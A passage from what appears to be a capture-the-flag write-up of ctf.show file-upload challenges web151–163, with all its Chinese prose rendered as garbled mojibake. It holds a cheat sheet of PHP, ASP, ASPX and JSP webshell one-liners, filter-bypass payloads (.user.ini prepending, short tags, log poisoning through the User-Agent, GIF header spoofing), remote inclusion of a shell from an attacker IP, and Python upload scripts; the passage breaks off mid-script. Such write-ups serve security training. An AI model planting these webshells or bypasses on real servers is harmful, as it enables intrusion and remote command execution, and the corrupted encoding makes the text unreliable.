important">?></span></span> åŠ äº†åˆ¤æ–­çš„PHPä¸€å¥è¯ï¼Œä¸ä¸Šé¢çš„ASPä¸€å¥è¯ç›¸åŒé“ç†ï¼Œä¹Ÿæ˜¯å¯ä»¥æ’åœ¨ä»»ä½•PHPæ–‡ä»¶ çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼&lt;%execute request(â€œclassâ€)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (â€œclassâ€)%>&lt;%execute request(â€œclassâ€)'&lt;% loop &lt;%:%> æ— é˜²ä¸‹è½½è¡¨ï¼Œæœ‰é˜²ä¸‹è½½è¡¨å¯å°è¯•æ’å…¥ä»¥ä¸‹è¯­å¥çªç ´çš„ä¸€å¥è¯ &lt;%eval(request(â€œ1â€³)):response.end%> å¤‡ä»½ä¸“ç”¨</code></pre><pre class="language-jsp" data-language="jsp"><code class="language-jsp">##JSPï¼š&lt;%if(request.getParameter(&quot;f&quot;)!&#x3D;null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; æäº¤å®¢æˆ·ç«¯ &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;textareaname&#x3D;&quot;t&quot;&gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot;value&#x3D;&quot;æäº¤&quot;&gt;&lt;&#x2F;form&gt;</code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##ASP&lt;%eval(Request.Item[&quot;r00ts&quot;],â€unsafeâ€);%&gt;&lt;%IfRequest(â€œ1â€³)&lt;&gt;â€&quot;ThenExecuteGlobal(Request(â€œ1â€³))%&gt; &lt;%execute(request(â€œ1â€³))%&gt; &lt;scriptrunat&#x3D;server&gt;execute request(â€œ1â€³)&lt;&#x2F;script&gt; ä¸ç”¨&#39;&lt;,&gt;â€˜çš„aspä¸€å¥è¯ </code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##aspx&lt;scriptrunat&#x3D;â€serverâ€&gt;WebAdmin2Y.x.y aaaaa &#x3D;newWebAdmin2Y.x.y (â€œadd6bb58e139be10â€³);&lt;&#x2F;script&gt; &lt;script language&#x3D;&quot;C#&quot;runat&#x3D;&quot;server&quot;&gt;WebAdmin2Y.x.y a&#x3D;new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;&#x2F;script&gt; &lt;%eval request(chr(35))%&gt;  ä¸ç”¨åŒå¼•å·çš„ä¸€å¥è¯ã€‚</code></pre><h4 id="å¸¸è§ç»•è¿‡å§¿åŠ¿"><a href="#å¸¸è§ç»•è¿‡å§¿åŠ¿" class="headerlink" title="å¸¸è§ç»•è¿‡å§¿åŠ¿"></a>å¸¸è§ç»•è¿‡å§¿åŠ¿</h4><h5 id="å¤§å†™ç»•è¿‡-æˆ–-åŒè§£æåç¼€åç»•è¿‡"><a href="#å¤§å†™ç»•è¿‡-æˆ–-åŒè§£æåç¼€åç»•è¿‡" class="headerlink" title="å¤§å†™ç»•è¿‡ æˆ– åŒè§£æåç¼€åç»•è¿‡"></a>å¤§å†™ç»•è¿‡ æˆ– åŒè§£æåç¼€åç»•è¿‡</h5><pre class="language-txt" data-language="txt"><code class="language-txt">åŒè§£æååç¼€ï¼šã€€ã€€PHPï¼š.php .php2 .php3 .php4 .php5 .php6 .php7 .phpç©ºæ ¼ .phtml .pgifã€€ã€€ã€€ã€€ .shtml .htaccess .phar .inc ã€€ã€€ASPï¼š.asp .aspx .config .ashx .asmx .aspq .axd .cshtm .cshtml .rem .soapã€€ã€€ã€€ã€€ .vbhtm .vbhtml .asa .cer .shtmlã€€ã€€JSPï¼š.jsp .jspx .jsw .jsv .sjspf .wss .do .action</code></pre><p>ç®€å•æ¥è¯´å°±æ˜¯ç”¨å„ç§å§¿åŠ¿ç»•è¿‡æœåŠ¡å™¨å¤„ç†é€»è¾‘ä¸Šä¼ æœ¨é©¬æ‹¿åˆ°WebShell</p><h3 id="web151-170"><a href="#web151-170" class="headerlink" title="web151-170"></a>web151-170</h3><h4 id="web151-Jså‰ç«¯é™åˆ¶"><a href="#web151-Jså‰ç«¯é™åˆ¶" class="headerlink" title="web151(Jså‰ç«¯é™åˆ¶)"></a>web151(Jså‰ç«¯é™åˆ¶)</h4><p>å‰ç«¯é™åˆ¶äº†åªèƒ½ä¸Šä¼ pngæ–‡ä»¶ï¼Œå¯ä»¥æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶åç¼€å</p><p><img src="web151.png" loading="lazy"></p><p>Payloadï¼š</p><blockquote><p>&#x2F;upload&#x2F;1.php</p><p>POST:attack&#x3D;system(â€˜tac ..&#x2F;flag.phpâ€™);</p></blockquote><h4 id="web152-MIMEåç«¯ç»•è¿‡"><a href="#web152-MIMEåç«¯ç»•è¿‡" class="headerlink" title="web152(MIMEåç«¯ç»•è¿‡)"></a>web152(MIMEåç«¯ç»•è¿‡)</h4><p>è™½ç„¶åç«¯ç®€å•æ£€æµ‹ï¼Œä½†æ˜¯å¦‚æœç›´æ¥ä¸Šä¼ png,æŠ“åŒ…çš„æ—¶å€™å†æ”¹åç¼€ï¼Œå…¶å®ä¸ç”¨ä¿®æ”¹Content-Typeï¼Œæ–¹æ³•åŒä¸Š</p><p><strong>MIME</strong></p><p>MIMEï¼ˆMultipurpose Internal MailExtensionsï¼‰å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚<br>æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæ¥æŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚<br>æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»å‹ï¼Œä¾‹å¦‚å£°éŸ³audioï¼Œå›¾åƒimageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»<br><strong>å¸¸è§çš„MIMEç±»å‹ï¼š</strong><br>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ï¼š.htmlâ€”â€”&gt;text&#x2F;html<br>xmlæ–‡æ¡£ï¼š.xmlâ€”â€”&gt;text&#x2F;xml<br>XHTMLæ–‡æ¡£ï¼š.xhtmlâ€”â€”&gt;application&#x2F;xhtml+xml<br>æ™®é€šæ–‡æœ¬ï¼š.txtâ€”â€”&gt;text&#x2F;plain<br>RTFæ–‡æœ¬ï¼š.rtfâ€”â€”&gt;application&#x2F;rtf<br>pngå›¾ç‰‡:.pngâ€”â€”&gt;image&#x2F;png</p><p>è¿™åº”è¯¥æ˜¯é¢„æœŸè§£ï¼Œæœ‰ç‚¹éº»çƒ¦</p><blockquote><p>ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼ŒåŒæ—¶ç”¨burpæŠ“åŒ…ï¼Œå°†burpä¸­çš„Content-Type:<br>application&#x2F;octet-streamä¿®æ”¹ä¸ºContent-Type:<br>image&#x2F;pngï¼Œå³è®©æœåŠ¡å™¨è®¤ä¸ºè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶å»è§£ææ‰§è¡Œ</p></blockquote><h4 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h4><p>å¸¸è§„å§¿åŠ¿éƒ½è¯•äº†å‘ç°æ²¡æ³•ç»•è¿‡ï¼Œå‘ç°uploadå¯ä»¥è®¿é—®ï¼Œè¯´æ˜é‡Œé¢å«æœ‰phpæ–‡ä»¶å¯ä»¥è€ƒè™‘ä½¿ç”¨.user.iniç»•è¿‡</p><p><strong>.user.ini</strong></p><ul><li>å½“å‰ç›®å½•é‡Œé¢æœ‰phpæ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥è¿ç”¨inié…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®è¿™ä¸ªphpæ–‡ä»¶</li><li>å’Œæ–‡ä»¶åŒ…å«æœ‰å…³çš„é…ç½®é¡¹æœ‰auto_append_fileå’Œauto_prepend_file</li></ul><p>åŸç†: æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ç±»</p><p>ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼šrequire(.&#x2F;a.jpg);è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äºauto_prepend_fileæ˜¯åœ¨</p><p>æ–‡ä»¶å‰æ’å…¥ï¼›auto_append_fileåœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰exit()æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰æ‰€ä»¥è¦æ±‚å½“</p><p>å‰ç›®å½•å¿…é¡»è¦æœ‰phpæ–‡ä»¶,å·§åˆçš„æ˜¯è¿™é¢˜uploadç›®å½•ä¸‹æœ‰ä¸ªindex.phpæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯å¯ä»¥æˆåŠŸçš„ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">1.txt</span></code></pre><p>ç„¶åä¸Šä¼ 1.txt è¿™ä¸ª1.txtæœ¨é©¬å°±è¢«è‡ªåŠ¨åŒ…å«è¿›åŸæ¥ç›®å½•é‡Œçš„phpæ–‡ä»¶äº†ï¼ˆä¸€èˆ¬æ˜¯index.phpï¼‰</p><p>Payloadï¼š&#x2F;upload?attack&#x3D;system(â€˜tac ..&#x2F;flag.phpâ€™);</p><h4 id="web154-PHPçŸ­æ ‡ç­¾"><a href="#web154-PHPçŸ­æ ‡ç­¾" class="headerlink" title="web154(PHPçŸ­æ ‡ç­¾)"></a>web154(PHPçŸ­æ ‡ç­¾)</h4><p>å‘ç°ä¸Šä¼ å¤±è´¥ï¼Œåº”è¯¥æ˜¯å¯¹txtæ–‡ä»¶é‡Œçš„å†…å®¹æœ‰è¿‡æ»¤ç»æ£€æµ‹ï¼ŒæŸ¥éªŒä¹‹åå‘ç°æ˜¯å¯¹<code>php</code>è¿™ä¸‰ä¸ªå­—æ¯è¿‡æ»¤äº†</p><p>PHPæ ‡ç­¾ç»•è¿‡ï¼š</p><ul><li><p>é•¿æ ‡ç­¾ï¼š<?php ?></p></li><li><p>çŸ­æ ‡ç­¾ï¼š<? ?>ã€<?=  ?>ã€&lt;%  %&gt;ã€&lt;%&#x3D;  %&gt;</p></li><li><p>å…¶ä¸­ <?  ?> éœ€è¦å¼€å¯ short_open_tag&#x3D;On ï¼Œ&lt;%  %&gt; éœ€è¦å¼€å¯ asp_tags&#x3D;On</p></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h4><p>è‡ªå¸¦ .user.iniï¼Œä½†ä¸å½±å“ï¼Œpayload ä¸ web154 ä¸€è‡´</p><h4 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h4><p>è¿‡æ»¤äº†<code>[]</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web157-nginxæ–‡ä»¶åŒ…å«"><a href="#web157-nginxæ–‡ä»¶åŒ…å«" class="headerlink" title="web157(nginxæ–‡ä»¶åŒ…å«)"></a>web157(nginxæ–‡ä»¶åŒ…å«)</h4><p>è¿‡æ»¤äº†<code>;``&#123;&#125;</code>ï¼Œä½†æ˜¯ä¸å½±å“ï¼Œå¯ä»¥ç›´æ¥åœ¨1.txté‡Œé¢æ‰§è¡Œå‘½ä»¤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span>tac <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fla<span class="token operator">*</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶ä»–ï¼š</p><p>ç”±äºæˆ‘ä»¬ $_POST[] åªä½¿ç”¨ä¸€ä¸ªå‚æ•°å¹¶ä¸”ä¸ºæ•°ç»„æ ¼å¼ï¼Œè€ƒè™‘ä½¿ç”¨ array_pop() å¼¹å‡ºæœ€åä¸€ä¸ªå•å…ƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>ç”±web158çš„é»‘åå•å¾—æ¥ï¼Œ#nginx çš„æ—¥å¿—ä¼šè·å– UAå¤´ ä¿¡æ¯#bp æŠ“åŒ…,åœ¨ UAå¤´ è¿›è¡Œæ³¨å…¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/log/nginx/access.log'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h4><p>banäº†logï¼Œå¯æ”¹ä¸º</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h4><p>banäº†()ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨åå¼•å·ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæˆ–è€…ä¹‹å‰çš„nginxæ—¥å¿—æ³¨å…¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h4><p>ç©ºæ ¼ï¼Œåå¼•å·è¢«banäº†</p><p>çªç ´ç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨æ¢è¡Œç¬¦%0a</p><p>å¯ä»¥ç»§ç»­æ—¥å¿—æ³¨å…¥æˆ–è€…phpä¼ªåè®®</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"ph"</span><span class="token operator">.</span><span class="token string double-quoted-string">"p://filter/convert.base64-encode/resource=../flag.p"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hp"</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web161-ä¼ªé€ å›¾ç‰‡å¤´GIF89a"><a href="#web161-ä¼ªé€ å›¾ç‰‡å¤´GIF89a" class="headerlink" title="web161(ä¼ªé€ å›¾ç‰‡å¤´GIF89a)"></a>web161(ä¼ªé€ å›¾ç‰‡å¤´GIF89a)</h4><p>å¢åŠ äº†å¯¹å›¾ç‰‡å¤´çš„è¯†åˆ«ï¼Œç”¨äº†getimagesize()è¿›è¡Œæ£€æµ‹</p><p>getimagesize(): ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚</p><p>inié—®ä»·å’Œä¸€å¥è¯æœ¨é©¬å‰éƒ½è¦åŠ ä¸€å¥GIF89aï¼Œæˆ–è€…æ”¹æˆpngæ–‡ä»¶å¤´89 50 4E 47</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web162-æ¡ä»¶ç«äº‰-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#web162-æ¡ä»¶ç«äº‰-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="web162(æ¡ä»¶ç«äº‰ è¿œç¨‹æ–‡ä»¶åŒ…å«)"></a>web162(æ¡ä»¶ç«äº‰ è¿œç¨‹æ–‡ä»¶åŒ…å«)</h4><p>å†…å®¹banäº†<code>.</code>ä¹‹å‰æ–¹æ³•å°±ä¸è¡Œäº†ï¼Œå¯ä»¥åŒ…å«<code>/tmp/sess_&#123;sessid&#125;</code>è¿›è¡Œæ¡ä»¶ç«äº‰</p><p>ä¹Ÿå¯ä»¥è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«</p><ol><li><p>å°†æœ¨é©¬ä¸Šä¼ è‡³è¿œç¨‹æœåŠ¡å™¨ï¼Œç”±äºè¿‡æ»¤äº†. æ‰€ä»¥éœ€è¦è½¬æ¢ä¸‹ï¼Œmm</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>æˆ–è€…<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>ä¸Šä¼ åŒ…å«æ–‡ä»¶ .user.ini</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">txt</span></code></pre></li><li><p>ä¸Šä¼ è¿œç¨‹è°ƒç”¨æ–‡ä»¶ txt <a href="https://www.bejson.com/convert/ip2int/">IPè½¬æ•°å­—</a></p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"http://æ•°å­—IP/mm"</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>è®¿é—®upload</p></li></ol><p><strong>ä½†æ˜¯æˆ‘åœ¨å°è¯•çš„æ—¶å€™ï¼Œæ€»æ˜¯è¿”å›400ğŸ˜…</strong></p><p>äºæ˜¯çœ‹åˆ°äº†å¦ä¸€ä¸ªéé¢„æœŸï¼Œé€šè¿‡å¼‚æˆ–ç¼–ç ç»•è¿‡è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨ python çš„ urllib.parse.unquote å‡½æ•°ç¼–ç å‚æ•°ï¼Œéœ€è¦è‡ªè¡Œå†™ä¸€ä¸ª int2byte </p><p>çš„å‡½æ•°ï¼Œè¿™é‡Œé‡åˆ°ä¸ªå‘ã€‚</p><p>é¡ºå¸¦ç”¨ python å®ç°äº†ä¸‹ php ä¸­å¯¹å­—ç¬¦ä¸²çš„å–åï¼Œå…¶å®å°±æ˜¯ <code>255 - å­—ç¬¦çš„ascii</code> å¾—åˆ°çš„ ascii å–å­—ç¬¦ã€‚äºæ˜¯å°±æœ‰äº†å¦‚ä¸‹è„šæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"/var/log/nginx/access.log"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://f0c1c895-2920-42b8-8f40-cff4a3a610b3.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 &lt;?=system('tac ../fla*');?>"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h4><p>ä¸Šä¼ å›¾ç‰‡åï¼Œä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥éœ€è¦åœ¨ä¸Šä¼ çš„ç¬é—´ï¼Œå°±postå‘½ä»¤æ‰§è¡Œï¼Œè¿˜å¯ä»¥ç›´æ¥åœ¨é…ç½®æ–‡ä»¶é‡Œè¿œç¨‹åŒ…å«ï¼Œç„¶åè®¿é—®&#x2F;upload&#x2F;index.phpã€‚</p><p>è¿™æ ·å°±ä¸ç”¨å³æ—¶å»postäº†ã€‚ï¼ˆè¿™ä¸ªè¦æ±‚æœåŠ¡å™¨å¼€å¯äº†è¿œç¨‹åŒ…å«é€‰é¡¹ï¼‰</p><p>åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šé¢è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"php://filter/convert.base64-encode/resource=/var/www/html/flag.php"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://ff4fcc76-8205-41ea-a4ba-52f257147647.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> 